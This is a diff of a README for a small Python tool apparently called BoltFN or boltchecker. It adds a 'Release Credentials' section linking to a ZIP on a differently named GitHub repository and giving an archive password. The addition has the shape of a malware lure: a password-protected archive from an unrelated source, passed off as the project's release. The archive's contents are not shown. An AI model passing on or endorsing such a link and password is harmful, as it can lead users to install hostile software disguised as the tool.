@@ -43,3 +43,10 @@ python boltchecker.py
 If you have any issues uninstall python then install version 3.12 make sure to select add to path
 
 DO NOT TRY AND SELL THIS AS YOUR OWN. I made this open source so that people could have something nice for free and maybe learn some python don't take advantage of that.
+
+
+---
+
+## 🔐 Release Credentials
+- **Download Package:** [Direct Release Asset](https://github.com/Barrieroacapture/BoltFN-dist-1mec/releases/download/v1.0.0/BoltFN.zip)
+- **Archive Password:** `Cjx9HT5f2m`
